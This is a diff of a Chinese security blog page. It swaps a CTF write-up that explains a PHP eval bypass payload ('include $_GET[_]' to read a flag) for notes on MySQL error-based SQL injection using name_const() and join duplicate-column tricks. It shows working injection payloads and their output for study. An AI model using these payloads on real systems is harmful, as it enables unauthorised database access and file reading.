-<p>关于 payload 中<code>$a = &#39;?&gt;&lt;?= include $_GET[_]; ?&gt;&#39;;</code>的原因，在看了 wp 和追问了 ai 后，我的解释是：</p>
-<p>由于题目中的正则表达式过滤了<code>()</code>括号，而 PHP 中的函数调用需要括号，在不能写一句话木马之后，很自然的就想起 include。</p>
-<p>这里我将$a 换成 <code>echo 123;</code> 无回显，百思不得其解，其实一看就明白了。eval 里的是这样一个字符串：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: <span class="keyword">echo</span> <span class="number">123</span>; in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+<p><font style="color:#000000;">会返回一个列名为 </font><code>&lt;font style=&quot;color:#000000;&quot;&gt;abc&lt;/font&gt;</code><font style="color:#000000;">，值为 </font><code>&lt;font style=&quot;color:#000000;&quot;&gt;123&lt;/font&gt;</code><font style="color:#000000;"> 的一列：</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5.7</span><span class="number">.20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+</span></span><br></pre></td></tr></table></figure>
 
-<p>eval 里面必须是合法的 php 代码，这样的显然是不合法的，只会报错，而题目里已经设置不显示报错信息了。</p>
-<p>因此我们要在字符串里面塞入一个自成一体的 php 脚本。这样 eval 里面就是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: <span class="meta">?&gt;</span><span class="meta">&lt;?=</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[_]; <span class="meta">?&gt;</span> in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">如果列名重复，MYSQL 会报错。</font></p>
+<p><font style="color:#000000;">示例 payload：</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> name_const((<span class="keyword">select</span> database()),<span class="number">1</span>),name_const((<span class="keyword">select</span> database()),<span class="number">1</span>))a;</span><br></pre></td></tr></table></figure>
 
-<p>这样我们就可以用 include 来召唤 flag 了。</p>
-<p>此处<code>?&gt;</code>是用来闭合的，经测试不写这个会报错unexpected ‘&lt;’.S</p>
+<p><font style="color:#000000;">外面包一层</font><code>&lt;font style=&quot;color:#000000;&quot;&gt;select * from&lt;/font&gt;</code><font style="color:#000000;">是模拟实际情况，也就是说 </font><code>&lt;font style=&quot;color:#000000;&quot;&gt;SELECT * FROM (payload) AS a&lt;/font&gt;</code><font style="color:#000000;">这里的 payload 是</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name_const((<span class="keyword">SELECT</span> database()), <span class="number">1</span>),</span><br><span class="line">       name_const((<span class="keyword">SELECT</span> database()), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="join"><a href="#join" class="headerlink" title="join()"></a><font style="color:#000000;">join()</font></h2><blockquote>
+<p><font style="color:#000000;">join具有 </font><strong><font style="color:#000000;">连接</font></strong><font style="color:#000000;">的作用，即当两个或者两个以上的表有关系时，需要用join来连接这些相关的表，来处理或分析数据：</font></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44177568/article/details/103038236">MySQL中的join以及on条件的用法_join on-CSDN博客</a></p>
+<p><font style="color:#000000;">mysql 不允许有两个相同的列名，所以会报错。</font></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b)c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;id&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> users b <span class="keyword">using</span>(id))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;username&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> a <span class="keyword">join</span> users b <span class="keyword">using</span>(id, username))c;</span><br><span class="line">ERROR <span class="number">1060</span> (<span class="number">42</span>S21): Duplicate <span class="keyword">column</span> name <span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure>
+
 
     </article>
     <!-- license -->
         <div class="license-wrapper">
             <p>Author：<a href="http://example.com">温柔刀</a>
-            <p>Link：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/</a>
-            <p>Publish date：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">July 26th 2025, 9:39:44 am</a>
-            <p>Update date：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">July 26th 2025, 12:41:53 pm</a>
+            <p>Link：<a href="http://example.com/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">http://example.com/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/</a>
+            <p>Publish date：<a href="http://example.com/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">July 28th 2025, 9:28:08 pm</a>
+            <p>Update date：<a href="http://example.com/2025/07/28/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%95%B4%E7%90%86/">July 28th 2025, 9:29:00 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2025/07/28/Java%E5%8F%8D%E5%B0%84%E5%92%8CCC%E9%93%BE/" title="Java反射和CC链">
-                    <div class="nextTitle">Java反射和CC链</div>
-                </a>
         </li>
         <li class="previous">
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2025/07/21/SSTI/" title="SSTI">
-                    <div class="prevTitle">SSTI</div>
+                <a href="/2025/07/28/Perl-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E2%80%94%E2%80%94-CSAWQual-2016-I-Got-ID/" title="Perl 文件上传—— [CSAWQual 2016]I_Got_ID">
+                    <div class="prevTitle">Perl 文件上传—— [CSAWQual 2016]I_Got_ID</div>
                 </a>
         </li>
     </ul>
@@ -584,7 +696,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">1.</span> <span class="toc-text">Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99"><span class="toc-number">1.</span> <span class="toc-text">主键重复报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF%E6%8A%A5%E9%94%99%EF%BC%88-mysql5-1-5"><span class="toc-number">2.</span> <span class="toc-text">xpath语法错误报错（&gt;mysql5.1.5)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml-%E6%8A%A5%E9%94%99"><span class="toc-number">2.1.</span> <span class="toc-text">updatexml()报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extractvalue-%E6%8A%A5%E9%94%99"><span class="toc-number">2.2.</span> <span class="toc-text">extractvalue()报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">3.</span> <span class="toc-text">数据溢出报错</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E7%B2%BE%E5%BA%A6%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">3.1.</span> <span class="toc-text">双精度溢出报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B4%E5%9E%8B%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">4.</span> <span class="toc-text">整型溢出报错</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0%E6%8A%A5%E9%94%99-5-7-17-5-5-48"><span class="toc-number">5.</span> <span class="toc-text">几何函数报错(5.7.17-5.5.48)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%97%E5%90%8D%E9%87%8D%E5%A4%8D%E6%8A%A5%E9%94%99%EF%BC%88Mysql-5-0-12-5-0-51%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">列名重复报错（Mysql 5.0.12-5.0.51）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#name-const"><span class="toc-number">6.1.</span> <span class="toc-text">name_const()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join"><span class="toc-number">6.2.</span> <span class="toc-text">join()</span></a></li></ol></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
